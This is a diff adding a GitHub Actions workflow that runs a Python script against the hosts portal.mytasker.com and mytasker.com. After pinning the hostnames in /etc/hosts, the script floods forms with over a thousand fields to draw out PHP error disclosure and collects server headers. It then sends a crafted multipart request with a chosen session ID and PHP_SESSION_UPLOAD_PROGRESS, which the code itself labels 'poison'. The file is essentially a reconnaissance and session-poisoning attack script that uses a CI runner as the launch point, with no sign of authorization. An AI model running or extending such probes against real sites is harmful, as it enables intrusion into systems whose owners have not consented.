@@ -1,0 +1,38 @@
+name: de
+on: workflow_dispatch
+jobs:
+  t:
+    runs-on: ubuntu-latest
+    timeout-minutes: 8
+    steps:
+      - name: pin
+        run: sudo sh -c 'echo "69.49.247.128 portal.mytasker.com" >> /etc/hosts; echo "69.49.247.128 mytasker.com" >> /etc/hosts'
+      - name: display_errors + upload_progress behaviour
+        run: |
+          python3 -m pip install -q requests
+          python3 - <<'PY'
+          import requests, uuid, re
+          s = requests.Session()
+          s.headers.update({"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Chrome/141"})
+          # 1) 1005 fields -> max_input_vars warning only if display_errors=On
+          d = {f"f{i}": "x" for i in range(1005)}
+          r = s.post("https://portal.mytasker.com/index.php", data=d, timeout=40)
+          body = r.text
+          print("status", r.status_code, "len", len(body))
+          print("max_input_vars_warning:", bool(re.search(r"max_input_vars|Input variables exceeded", body, re.I)))
+          print("php_notice_any:", bool(re.search(r"<b>(Warning|Notice|Deprecated)</b>|Warning:", body)))
+          print("x_powered_by:", r.headers.get("X-Powered-By"))
+          print("server:", r.headers.get("Server"))
+          # 2) same on the main app
+          r2 = s.post("https://mytasker.com/contact-submit", data=d, timeout=40)
+          print("main status", r2.status_code, "warn:", bool(re.search(r"max_input_vars|Input variables exceeded", r2.text, re.I)))
+          print("main x_powered_by:", r2.headers.get("X-Powered-By"))
+          # 3) upload_progress engagement on main app too
+          b = "----x" + uuid.uuid4().hex
+          sid = "s3rs" + uuid.uuid4().hex[:24]
+          body3 = (f"--{b}\r\nContent-Disposition: form-data; name=\"PHPSESSID\"\r\n\r\n{sid}\r\n"
+                   f"--{b}\r\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\nx\r\n"
+                   f"--{b}\r\nContent-Disposition: form-data; name=\"f\"; filename=\"a\"\r\n\r\nZ\r\n--{b}--\r\n").encode()
+          r3 = s.post("https://mytasker.com/", data=body3, headers={"Content-Type": f"multipart/form-data; boundary={b}"}, timeout=40)
+          print("main poison status", r3.status_code, "cookies:", [c.name for c in r3.cookies])
+          PY
